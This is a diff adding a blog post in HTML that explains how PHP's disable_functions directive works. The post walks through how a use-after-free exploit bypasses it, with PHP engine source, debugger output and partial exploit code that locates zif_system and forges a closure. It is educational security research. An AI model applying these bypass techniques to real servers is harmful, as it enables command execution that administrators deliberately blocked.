@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>From memory corruption to disable_functions bypass: understanding PHP exploits | Doomsday Vault</title>
+<meta name="generator" content="Jekyll v3.9.5" />
+<meta property="og:title" content="From memory corruption to disable_functions bypass: understanding PHP exploits" />
+<meta name="author" content="X-C3LL" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Overview of PHP internals related with disable_functions and how common exploits works" />
+<meta property="og:description" content="Overview of PHP internals related with disable_functions and how common exploits works" />
+<link rel="canonical" href="http://localhost:4000/posts/2020/02/09/UAF-PHP-disable_functions.html" />
+<meta property="og:url" content="http://localhost:4000/posts/2020/02/09/UAF-PHP-disable_functions.html" />
+<meta property="og:site_name" content="Doomsday Vault" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-02-09T02:13:37+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="From memory corruption to disable_functions bypass: understanding PHP exploits" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"X-C3LL"},"dateModified":"2020-02-09T02:13:37+01:00","datePublished":"2020-02-09T02:13:37+01:00","description":"Overview of PHP internals related with disable_functions and how common exploits works","headline":"From memory corruption to disable_functions bypass: understanding PHP exploits","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/2020/02/09/UAF-PHP-disable_functions.html"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/img/logo.jpg"},"name":"X-C3LL"},"url":"http://localhost:4000/posts/2020/02/09/UAF-PHP-disable_functions.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=c27a30cb27997bd3ed45ba5a77bd97bd27cbeb64">
+    <!--[if lt IE 9]>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <![endif]-->
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+  <body>
+    <div class="wrapper">
+      <header>
+
+        <h1><a href="http://localhost:4000/">Doomsday Vault</a></h1>
+
+        
+          <img src="/assets/img/logo.jpg" alt="Logo" />
+        
+
+        <p>X-C3LL's Personal Blog :)</p>
+
+
+        
+        <ul class="downloads">
+          <li><a href="https://twitter.com/TheXC3LL">@TheXC3LL<strong>Twitter</strong></a></li>
+          <li><a href="https://www.linkedin.com/in/thexc3ll/">thexc3ll<strong>LinkedIn</strong></a></li>
+          <li><a href="https://mastodon.social/@XC3LL">@XC3LL<strong>Mastodon</strong></a></li>
+        </ul>
+        
+               <nav>
+  <ul>
+    <li><a href="/">Home</a></li>
+  <li><a href="/about.html">About</a></li>
+    <li><a href="/cves.html">CVEs</a></li>
+    <li><a href="/tools.html">Tools</a></li>
+    <li><a href="/stuff.html">Slides & Articles</a></li>
+  <li><a href="/rss.xml">RSS</a>/<a href="/atom.xml">Atom</a></li>
+  
+</ul>
+</nav>
+      </header>
+      <section>
+
+      <small>9 February 2020</small>
+<h1>From memory corruption to disable_functions bypass: understanding PHP exploits</h1>
+
+
+<p>        
+In a tremendously generic and simplistic way, we can classify disable_functions exploits under two big “labels”: or they are related with a call to an external binary (for example the well-known mail() + putenv() exploited by the tool <a href="https://github.com/TarlogicSecurity/Chankro">Chankro</a>, command injections like <a href="https://www.exploit-db.com/exploits/35146">shellshock</a>/<a href="https://github.com/Bo0oM/PHP_imap_open_exploit/blob/master/exploit.php">imap_open()</a>, etc.) or they are based on memory corruptions. About the first kind of exploits we already talked before in this blog, and even explained <a href="https://x-c3ll.github.io/posts/find-bypass-disable_functions/">a naive way to discover them automagically</a>. So lets focus this time on the second one <strong>:D</strong></p>
+
+<p>        
+We are going to dive on this topic with the help of <a href="https://raw.githubusercontent.com/mm0r1/exploits/master/php7-backtrace-bypass/exploit.php">this exploit</a> from  mm0r1. Instead on focus on the root casue or how the UAF works, our intention is to explain how the bypass is made. The same technique can be translated to similar vulnerabilities.</p>
+
+<p>        
+Our setup is based on a Debian and PHP compiled with debugging symbols:</p>
+
+<ul>
+  <li>PHP 7.2.11 (cli) (built: Oct 24 2018 01:39:46) ( NTS )</li>
+  <li>Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64 GNU/Linux</li>
+</ul>
+
+<p>        
+Let’s begin!</p>
+
+<h2 id="how-disable_functions-works">How disable_functions works</h2>
+<p>        
+The first thing we have to clarify is how this directive works. In PHP the functions are classified in two types: “internals” functions (var_dump(), base64_decode(), etc.) and “user” functions  (function blabla($a,$b){…}). Both of them are registered by the engine in a HashTable called <strong>function_table</strong> and this HashTable is the one used to look up functions when they are called from a PHP script.</p>
+
+<p>        
+The main code responsible for applying the directive is the following:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ZEND_API</span> <span class="kt">int</span> <span class="nf">zend_disable_function</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">function_name</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">function_name_length</span><span class="p">)</span> 
+<span class="p">{</span>
+	<span class="n">zend_internal_function</span> <span class="o">*</span><span class="n">func</span><span class="p">;</span>
+	<span class="k">if</span> <span class="p">((</span><span class="n">func</span> <span class="o">=</span> <span class="n">zend_hash_str_find_ptr</span><span class="p">(</span><span class="n">CG</span><span class="p">(</span><span class="n">function_table</span><span class="p">),</span> <span class="n">function_name</span><span class="p">,</span> <span class="n">function_name_length</span><span class="p">)))</span> <span class="p">{</span>
+		<span class="n">zend_free_internal_arg_info</span><span class="p">(</span><span class="n">func</span><span class="p">);</span>
+		<span class="n">func</span><span class="o">-&gt;</span><span class="n">fn_flags</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="p">(</span><span class="n">ZEND_ACC_VARIADIC</span> <span class="o">|</span> <span class="n">ZEND_ACC_HAS_TYPE_HINTS</span> <span class="o">|</span> <span class="n">ZEND_ACC_HAS_RETURN_TYPE</span><span class="p">);</span>
+		<span class="n">func</span><span class="o">-&gt;</span><span class="n">num_args</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+		<span class="n">func</span><span class="o">-&gt;</span><span class="n">arg_info</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+		<span class="n">func</span><span class="o">-&gt;</span><span class="n">handler</span> <span class="o">=</span> <span class="n">ZEND_FN</span><span class="p">(</span><span class="n">display_disabled_function</span><span class="p">);</span>
+		<span class="k">return</span> <span class="n">SUCCESS</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="n">FAILURE</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>        
+The code looks up the function name inside the function_table and changes the original handler to a function called display_disabled_function. As you can imagine, it gives you the classic message:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Dummy function which displays an error when a disabled function is called. */</span>
+<span class="n">ZEND_API</span> <span class="n">ZEND_COLD</span> <span class="nf">ZEND_FUNCTION</span><span class="p">(</span><span class="n">display_disabled_function</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="n">zend_error</span><span class="p">(</span><span class="n">E_WARNING</span><span class="p">,</span> <span class="s">"%s() has been disabled for security reasons"</span><span class="p">,</span> <span class="n">get_active_function_name</span><span class="p">());</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>        
+So everytime we try to call a function disabled by this directive we are going to call <strong>display_disabled_function</strong> instead of the desired one <strong>:(</strong>. We can corroborate this behavior using a debugger. To test this put a breakpoint on <strong>zend_disable_function</strong> and run the binary with <code class="language-plaintext highlighter-rouge">-d 'disable_functions=system' exploit.php</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Breakpoint zend_disable_function
+pwndbg&gt; bt
+#0  zend_disable_function (function_name=0x555556811aa0 "system", function_name_length=6) at /tmp/php-7.2.11/Zend/zend_API.c:2839
+#1  0x0000555555ae6a0b in php_disable_functions () at /tmp/php-7.2.11/main/main.c:229
+#2  0x0000555555aeb1d4 in php_module_startup (sf=0x5555566bd9e0 &lt;cli_sapi_module&gt;, additional_modules=0x0, num_additional_modules=0) at /tmp/php-7.2.11/main/main.c:2326
+#3  0x0000555555d4e479 in php_cli_startup (sapi_module=0x5555566bd9e0 &lt;cli_sapi_module&gt;) at /tmp/php-7.2.11/sapi/cli/php_cli.c:431
+#4  0x0000555555d509d1 in main (argc=4, argv=0x5555566f2890) at /tmp/php-7.2.11/sapi/cli/php_cli.c:1371
+#5  0x00007ffff69282e1 in __libc_start_main (main=0x555555d503fb &lt;main&gt;, argc=4, argv=0x7fffffffe4b8, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffe4a8) at ../csu/libc-start.c:291
+#6  0x0000555555684d3a in _start ()
+</code></pre></div></div>
+
+<p>        
+We can see how the function name declared in the directive (system) is passed as argument to this function. At this point the handler from the function_table is untouched:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; p *func
+$7 = {
+  type = 1 '\001',
+  arg_flags = "\004\000",
+  fn_flags = 256,
+  function_name = 0x555556726a90,
+  scope = 0x0,
+  prototype = 0x0,
+  num_args = 2,
+  required_num_args = 1,
+  arg_info = 0x5555565f80d8 &lt;arginfo_system+24&gt;,
+  handler = 0x5555559fa20b &lt;zif_system&gt;,
+  module = 0x555556721730,
+  reserved = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0}
+}
+</code></pre></div></div>
+<p>        
+Lets check the value again just before the return:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; p *func 
+$8 = {
+  type = 1 '\001',
+  arg_flags = "\004\000",
+  fn_flags = 256,
+  function_name = 0x555556726a90,
+  scope = 0x0,
+  prototype = 0x0,
+  num_args = 0,
+  required_num_args = 1,
+  arg_info = 0x0,
+  handler = 0x555555baa699 &lt;zif_display_disabled_function&gt;,
+  module = 0x555556721730,
+  reserved = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0}
+}
+</code></pre></div></div>
+<p>        
+Now the handler field is pointing to the display_disabled_function. If you are wondering why the functions have a “zif_” prefix it is because they are created using the <a href="http://www.phpinternalsbook.com/php7/extensions_design/php_functions.html#registering-php-functions">PHP_FUNCTION macro and it expands to a C symbol with the acronym of “Zend Internal Function”</a>.</p>
+
+<p>        
+This tactic prevents the calls to “dangerous” functions inside the script but… zif_system is not erased from the universe. It still existing in the process and we can reach it if we can play with the memory <strong>:)</strong>.</p>
+
+<h2 id="when-the-memory-corruption-comes-handy">When the memory corruption comes handy</h2>
+<p>        
+The first thing we need is to findthe <strong>zif_system</strong> location at runtime. For that we need a primitive to leak arbitrary memory contents. The exploit solves this search finding the binary base and then parsing the ELF structures in order to find the target function:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">parse_elf</span><span class="p">(</span><span class="nv">$base</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$e_type</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+
+        <span class="nv">$e_phoff</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>
+        <span class="nv">$e_phentsize</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+        <span class="nv">$e_phnum</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+
+        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$e_phnum</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$header</span> <span class="o">=</span> <span class="nv">$base</span> <span class="o">+</span> <span class="nv">$e_phoff</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="nv">$e_phentsize</span><span class="p">;</span>
+            <span class="nv">$p_type</span>  <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
+            <span class="nv">$p_flags</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
+            <span class="nv">$p_vaddr</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>
+            <span class="nv">$p_memsz</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">);</span>
+
+            <span class="k">if</span><span class="p">(</span><span class="nv">$p_type</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nv">$p_flags</span> <span class="o">==</span> <span class="mi">6</span><span class="p">)</span> <span class="p">{</span> <span class="c1"># PT_LOAD, PF_Read_Write</span>
+                <span class="c1"># handle pie</span>
+                <span class="nv">$data_addr</span> <span class="o">=</span> <span class="nv">$e_type</span> <span class="o">==</span> <span class="mi">2</span> <span class="o">?</span> <span class="nv">$p_vaddr</span> <span class="o">:</span> <span class="nv">$base</span> <span class="o">+</span> <span class="nv">$p_vaddr</span><span class="p">;</span>
+                <span class="nv">$data_size</span> <span class="o">=</span> <span class="nv">$p_memsz</span><span class="p">;</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$p_type</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nv">$p_flags</span> <span class="o">==</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span> <span class="c1"># PT_LOAD, PF_Read_exec</span>
+                <span class="nv">$text_size</span> <span class="o">=</span> <span class="nv">$p_memsz</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$data_addr</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$text_size</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$data_size</span><span class="p">)</span>
+            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+
+        <span class="k">return</span> <span class="p">[</span><span class="nv">$data_addr</span><span class="p">,</span> <span class="nv">$text_size</span><span class="p">,</span> <span class="nv">$data_size</span><span class="p">];</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">get_basic_funcs</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="nv">$elf</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">list</span><span class="p">(</span><span class="nv">$data_addr</span><span class="p">,</span> <span class="nv">$text_size</span><span class="p">,</span> <span class="nv">$data_size</span><span class="p">)</span> <span class="o">=</span> <span class="nv">$elf</span><span class="p">;</span>
+        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$data_size</span> <span class="o">/</span> <span class="mi">8</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$leak</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$data_addr</span><span class="p">,</span> <span class="nv">$i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">);</span>
+            <span class="k">if</span><span class="p">(</span><span class="nv">$leak</span> <span class="o">-</span> <span class="nv">$base</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nv">$leak</span> <span class="o">-</span> <span class="nv">$base</span> <span class="o">&lt;</span> <span class="nv">$data_addr</span> <span class="o">-</span> <span class="nv">$base</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nv">$deref</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$leak</span><span class="p">);</span>
+                <span class="c1"># 'constant' constant check</span>
+                <span class="k">if</span><span class="p">(</span><span class="nv">$deref</span> <span class="o">!=</span> <span class="mh">0x746e6174736e6f63</span><span class="p">)</span>
+                    <span class="k">continue</span><span class="p">;</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="k">continue</span><span class="p">;</span>
+
+            <span class="nv">$leak</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$data_addr</span><span class="p">,</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span><span class="p">);</span>
+            <span class="k">if</span><span class="p">(</span><span class="nv">$leak</span> <span class="o">-</span> <span class="nv">$base</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nv">$leak</span> <span class="o">-</span> <span class="nv">$base</span> <span class="o">&lt;</span> <span class="nv">$data_addr</span> <span class="o">-</span> <span class="nv">$base</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nv">$deref</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$leak</span><span class="p">);</span>
+                <span class="c1"># 'bin2hex' constant check</span>
+                <span class="k">if</span><span class="p">(</span><span class="nv">$deref</span> <span class="o">!=</span> <span class="mh">0x786568326e6962</span><span class="p">)</span>
+                    <span class="k">continue</span><span class="p">;</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="k">continue</span><span class="p">;</span>
+
+            <span class="k">return</span> <span class="nv">$data_addr</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">get_binary_base</span><span class="p">(</span><span class="nv">$binary_leak</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$base</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="nv">$start</span> <span class="o">=</span> <span class="nv">$binary_leak</span> <span class="o">&amp;</span> <span class="mh">0xfffffffffffff000</span><span class="p">;</span>
+        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mh">0x1000</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$addr</span> <span class="o">=</span> <span class="nv">$start</span> <span class="o">-</span> <span class="mh">0x1000</span> <span class="o">*</span> <span class="nv">$i</span><span class="p">;</span>
+            <span class="nv">$leak</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">7</span><span class="p">);</span>
+            <span class="k">if</span><span class="p">(</span><span class="nv">$leak</span> <span class="o">==</span> <span class="mh">0x10102464c457f</span><span class="p">)</span> <span class="p">{</span> <span class="c1"># ELF header</span>
+                <span class="k">return</span> <span class="nv">$addr</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">get_system</span><span class="p">(</span><span class="nv">$basic_funcs</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$addr</span> <span class="o">=</span> <span class="nv">$basic_funcs</span><span class="p">;</span>
+        <span class="k">do</span> <span class="p">{</span>
+            <span class="nv">$f_entry</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$addr</span><span class="p">);</span>
+            <span class="nv">$f_name</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$f_entry</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span>
+
+            <span class="k">if</span><span class="p">(</span><span class="nv">$f_name</span> <span class="o">==</span> <span class="mh">0x6d6574737973</span><span class="p">)</span> <span class="p">{</span> <span class="c1"># system</span>
+                <span class="k">return</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$addr</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>
+            <span class="p">}</span>
+            <span class="nv">$addr</span> <span class="o">+=</span> <span class="mh">0x20</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">while</span><span class="p">(</span><span class="nv">$f_entry</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">);</span>
+        <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<p>        
+Once we have this information the next step is to think in a way to call zif_system. In this exploit an approach based on closures is used. In PHP <a href="https://www.php.net/manual/en/functions.anonymous.php">anonymous functions are implemented using the Closure class</a>. The main structue related to closures is <strong>zend_closure</strong>:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_zend_closure</span> <span class="p">{</span>
+	<span class="n">zend_object</span>       <span class="n">std</span><span class="p">;</span>
+	<span class="n">zend_function</span>     <span class="n">func</span><span class="p">;</span>
+	<span class="n">zval</span>              <span class="n">this_ptr</span><span class="p">;</span>
+	<span class="n">zend_class_entry</span> <span class="o">*</span><span class="n">called_scope</span><span class="p">;</span>
+	<span class="n">zif_handler</span>       <span class="n">orig_internal_handler</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">zend_closure</span><span class="p">;</span>
+</code></pre></div></div>
+<p>        
+Getting deeper inside the func field we can find that exists a handler pointing to the function with the code that will be executed. Indeed, the closure object created by the exploit (the real one) is:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; p (*(zend_closure *) 0x7ffff38652c0)-&gt;func-&gt;internal_function
+$3 = {
+  type = 2 '\002',
+  arg_flags = "\000\000",
+  fn_flags = 135266304,
+  function_name = 0x7ffff3801d70,
+  scope = 0x0,
+  prototype = 0x7ffff38652c0,
+  num_args = 1,
+  required_num_args = 1,
+  arg_info = 0x7ffff387c0f0,
+  handler = 0x7ffff3879068,
+  module = 0x2,
+  reserved = {0x7ffff3873280, 0x1, 0x7ffff3879070, 0x0, 0x0, 0x0}
+}
+</code></pre></div></div>
+
+<p>        
+The exploit creates a fake closure object copying the values and changing the type to the value “1” (internal function) and the handle to the zif_system location, so this function will be called instead:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; p (*(zend_closure *) 0x7ffff38929a8)-&gt;func-&gt;internal_function
+$4 = {
+  type = 1 '\001',
+  arg_flags = "\000\000",
+  fn_flags = 135266304,
+  function_name = 0x7ffff3801d70,
+  scope = 0x0,
+  prototype = 0x7ffff38652c0,
+  num_args = 1,
+  required_num_args = 1,
+  arg_info = 0x7ffff387c0f0,
+  handler = 0x5555559fa20b &lt;zif_system&gt;,
+  module = 0x2,
+  reserved = {0x7ffff3873280, 0x1, 0x7ffff3879070, 0x0, 0x0, 0x0}
+}
+</code></pre></div></div>
+
+<h2 id="conclusions">Conclusions</h2>
+<p>        
+I hope this brief post can be useful to understand how disable_functions works and how the memory corruptions are used in order to achieve a bypass. As long as you can run arbitrary code inside the process you are going to be able to call any function inside the binary. If you find any error or typo, feel free to ping me at twitter (<a href="https://twitter.com/TheXC3LL">@TheXC3LL</a>) so I can fix it.</p>
+
+
+
+
+
+      </section>
+      <footer>
+        
+        <p>This project is maintained by <a href="https://github.com/pages-themes">pages-themes</a></p>
+        
+        <p><small>Hosted on GitHub Pages &mdash; Theme by <a href="https://github.com/orderedlist">orderedlist</a></small></p>
+      </footer>
+    </div>
+    <script src="/assets/js/scale.fix.js"></script>
+  </body>
+</html>
